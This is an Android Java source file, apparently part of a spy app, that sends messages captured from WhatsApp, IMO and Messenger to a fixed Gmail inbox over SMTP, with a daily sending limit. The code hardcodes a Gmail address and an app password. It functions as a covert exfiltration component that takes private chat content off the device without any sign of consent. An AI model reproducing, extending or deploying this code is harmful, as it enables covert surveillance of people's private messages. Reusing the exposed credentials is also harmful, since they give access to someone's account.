package com.example.fasterpro11;

import android.util.Log;
import java.util.Properties;
import javax.mail.*;
import javax.mail.internet.*;

public class JavaMailAPI_WhatsAppIMOMessengerSender {
    private static final String TAG = "JavaMailAPI_WhatsAppIMOMessengerSender";

    public static void sendEmail(String app, String message) {
        // দৈনিক সীমা চেক করুন
        if (!CountEmail.canSendEmail()) {
            Log.d(TAG, "Email limit reached for today. No email sent.");
            return; // ইমেল পাঠানো হবে না
        }

        final String username = "abontiangum99@gmail.com"; // আপনার Gmail ঠিকানা
        final String password = "egqnjvccoqtgwaxo"; // আপনার Gmail পাসওয়ার্ড

        Properties props = new Properties();
        props.put("mail.smtp.auth", "true");
        props.put("mail.smtp.starttls.enable", "true");
        props.put("mail.smtp.host", "smtp.gmail.com"); // SMTP সার্ভার
        props.put("mail.smtp.port", "587"); // SMTP পোর্ট

        Session session = Session.getInstance(props,
                new javax.mail.Authenticator() {
                    protected PasswordAuthentication getPasswordAuthentication() {
                        return new PasswordAuthentication(username, password);
                    }
                });

        try {
            Message mimeMessage = new MimeMessage(session);
            mimeMessage.setFrom(new InternetAddress(username));
            mimeMessage.setRecipients(Message.RecipientType.TO,
                    InternetAddress.parse("abontiangum99@gmail.com")); // গন্তব্যের ইমেইল ঠিকানা
            mimeMessage.setSubject("New Message from " + app);
            mimeMessage.setText("Message received from " + app + ":\n\n" + message);

            Transport.send(mimeMessage);
            CountEmail.incrementEmailCount(); // ইমেল সফলভাবে পাঠানোর পর কাউন্টার বাড়ান

            Log.d(TAG, "JavaMailAPI_WhatsAppIMOMessengerSender Email sent successfully.");
        } catch (MessagingException e) {
            Log.e(TAG, "JavaMailAPI_WhatsAppIMOMessengerSender Failed to send email: " + e.getMessage(), e);
        }
    }
}
